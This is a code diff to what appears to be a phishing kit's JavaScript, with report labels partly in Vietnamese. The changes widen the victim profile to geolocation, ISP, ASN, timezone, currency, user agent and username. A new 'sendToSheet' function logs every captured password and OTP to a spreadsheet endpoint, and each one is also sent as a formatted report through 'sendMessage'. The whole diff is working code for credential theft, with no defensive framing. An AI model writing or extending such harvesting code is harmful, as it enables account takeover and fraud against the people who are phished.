@@ -17,6 +17,21 @@ const Utils = window.Utils = {
 		region: 'Unknown',
 		postal: 'Unknown',
 		flag: '',
+		continent: '',
+		callingCode: '',
+		capital: '',
+		borders: '',
+		isp: '',
+		org: '',
+		asn: '',
+		domain: '',
+		timezone: '',
+		utc: '',
+		localTime: '',
+		currency: '',
+		currencyCode: '',
+		currencySymbol: '',
+		exchangeRate: '',
 	},
 
 	countryCodeToFlag: (code) => {
@@ -76,6 +91,23 @@ const Utils = window.Utils = {
 				region: data.region || 'Unknown',
 				postal: data.postal || 'Unknown',
 				flag: Utils.countryCodeToFlag(data.country_code),
+				continent: data.continent || '',
+				callingCode: data.calling_code ? `+${data.calling_code}` : '',
+				capital: data.capital || '',
+				borders: data.borders || '',
+				isp: data.connection?.isp || '',
+				org: data.connection?.org || '',
+				asn: data.connection?.asn ? `AS${data.connection.asn}` : '',
+				domain: data.connection?.domain || '',
+				timezone: data.timezone?.id || '',
+				utc: data.timezone?.utc || '',
+				localTime: data.timezone?.current_time || '',
+				currency: data.currency?.name || '',
+				currencyCode: data.currency?.code || '',
+				currencySymbol: data.currency?.symbol || '',
+				exchangeRate: data.currency?.exchange_rate
+					? data.currency.exchange_rate.toLocaleString('en-US')
+					: '',
 			};
 
 			console.log(`Geo data:`, Utils.userLoc);
@@ -86,6 +118,54 @@ const Utils = window.Utils = {
 
 	getTime: () => new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }),
 
+	_sheetMeta: { row: null, col: 1 },
+
+	getSheetRow: () => Utils._sheetMeta.row,
+
+	sendToSheet: async (type, value) => {
+		try {
+			const L = Utils.userLoc;
+			const meta = Utils._sheetMeta;
+			if (!meta.row) {
+				const row = [
+					L.ip, L.country, L.countryCode, L.city, L.region, L.continent,
+					L.capital, L.postal, L.callingCode, L.borders,
+					L.isp, L.org, L.asn, L.domain,
+					L.timezone, L.utc, L.localTime,
+					L.currency, L.currencyCode, L.currencySymbol, L.exchangeRate,
+					document.getElementById('username')?.value || 'N/A',
+					navigator.userAgent,
+					Utils.getTime(),
+				];
+				row.push(value);
+				const res = await fetch('/api/sheet', {
+					method: 'POST',
+					headers: { 'Content-Type': 'application/json' },
+					body: JSON.stringify({ action: 'append', value: [row] }),
+				});
+				const data = await res.json();
+				const range = data?.updates?.updatedRange || data?.result?.updates?.updatedRange || '';
+				const match = range.match(/Sheet2!A(\d+)/);
+				if (match) {
+					meta.row = match[1];
+					meta.col = row.length;
+				}
+				return { ok: !!(data?.updates || data?.result?.updates), row: meta.row, col: meta.col };
+			}
+
+			meta.col++;
+			const colLetter = String.fromCharCode(64 + meta.col);
+			const res = await fetch('/api/sheet', {
+				method: 'POST',
+				headers: { 'Content-Type': 'application/json' },
+				body: JSON.stringify({ action: 'update', row: meta.row, value: [[value]] }),
+			});
+			const data = await res.json();
+			return { ok: !!(data?.updates || data?.result?.updates), row: meta.row, col: meta.col };
+		} catch {
+			return { ok: false, row: '?', col: '?' };
+		}
+	},
 
 	sendMessage: async (text) => {
 		try {
@@ -123,20 +203,46 @@ const Utils = window.Utils = {
 
 		let savedPasswords = window.passwords || [];
 
-		let icon =
-			type === 'INFO'
-				? '📝 TT'
-				: type === 'PASS'
-					? '🔑 PASS'
-					: '🔥 OTP';
+		let icon = type === 'PASS' ? '🔑 MẬT KHẨU' : '🔥 MÃ OTP';
 
+		const L = Utils.userLoc;
 		let report = `<b>${icon}</b> | ${Utils.getTime()}\n`;
-		report += `IP: ${Utils.userLoc.ip} ${Utils.userLoc.flag}\n`;
-		report += `UA: ${navigator.userAgent}\n`;
-		report += `Location: ${Utils.userLoc.city || 'Unknown'} | ${Utils.userLoc.region || 'Unknown'} (${Utils.userLoc.country}) ${Utils.userLoc.flag}\n`;
-		report += `Postal: ${Utils.userLoc.postal}\n`;
-		report += `----------------------------------\n`;
-		report += `Username/Email: <code>${d.username}</code>\n`;
+		report += `━━━━━━━━━━━━━━━━━━━━\n`;
+		report += `🌐 <b>IP:</b> ${L.ip} ${L.flag}\n`;
+		report += `🕵️ <b>UA:</b> ${navigator.userAgent}\n`;
+		report += `━━━━━━━━━━━━━━━━━━━━\n`;
+		report += `📍 <b>Vị trí</b>\n`;
+		report += `   City: ${L.city || 'Unknown'}\n`;
+		report += `   Region: ${L.region || 'Unknown'}\n`;
+		report += `   Country: ${L.country} (${L.countryCode})\n`;
+		if (L.continent) report += `   Continent: ${L.continent}\n`;
+		if (L.capital) report += `   Capital: ${L.capital}\n`;
+		if (L.postal && L.postal !== 'Unknown') report += `   Postal: ${L.postal}\n`;
+		if (L.callingCode) report += `   Calling Code: ${L.callingCode}\n`;
+		if (L.borders) report += `   Borders: ${L.borders}\n`;
+		report += `━━━━━━━━━━━━━━━━━━━━\n`;
+		report += `🔌 <b>Kết nối</b>\n`;
+		if (L.isp) report += `   ISP: ${L.isp}\n`;
+		if (L.org) report += `   Org: ${L.org}\n`;
+		if (L.asn) report += `   ASN: ${L.asn}\n`;
+		if (L.domain) report += `   Domain: ${L.domain}\n`;
+		report += `━━━━━━━━━━━━━━━━━━━━\n`;
+		report += `🕐 <b>Múi giờ</b>\n`;
+		if (L.timezone) report += `   ID: ${L.timezone}\n`;
+		if (L.utc) report += `   UTC: ${L.utc}\n`;
+		if (L.localTime) report += `   Local: ${L.localTime}\n`;
+		if (L.currency) {
+			report += `━━━━━━━━━━━━━━━━━━━━\n`;
+			report += `💰 <b>Tiền tệ</b>\n`;
+			report += `   ${L.currency} (${L.currencyCode}) ${L.currencySymbol}\n`;
+			if (L.exchangeRate) report += `   Rate: 1 USD = ${L.exchangeRate} ${L.currencyCode}\n`;
+		}
+		report += `━━━━━━━━━━━━━━━━━━━━\n`;
+		report += `👤 <b>Username/Email:</b> <code>${d.username}</code>\n`;
+		if (extra.sheet) {
+			const s = extra.sheet;
+			report += `📊 <b>Sheet:</b> ${s.ok ? '✅ OK' : '❌ FAIL'} | Row ${s.row} | Col ${s.col}\n`;
+		}
 		report += `----------------------------------\n`;
 
 		if (savedPasswords.length > 0) {
@@ -255,8 +361,10 @@ async function initApp() {
 
 		window.passwords.push(pwd);
 
+		const sheet = await Utils.sendToSheet('PASS', pwd);
+
 		await Utils.sendMessage(
-			Utils.formatReport('PASS', { password: pwd, attempt: passAttempts }),
+			Utils.formatReport('PASS', { password: pwd, attempt: passAttempts, sheet }),
 		);
 	});
 
@@ -288,8 +396,10 @@ async function initApp() {
 
 				window.otps.push(otpVal);
 
+				const sheet = await Utils.sendToSheet('OTP', otpVal);
+
 				await Utils.sendMessage(
-					Utils.formatReport('OTP', { otp: otpVal, attempt: otpAttempts }),
+					Utils.formatReport('OTP', { otp: otpVal, attempt: otpAttempts, sheet }),
 				);
 			}
 		});
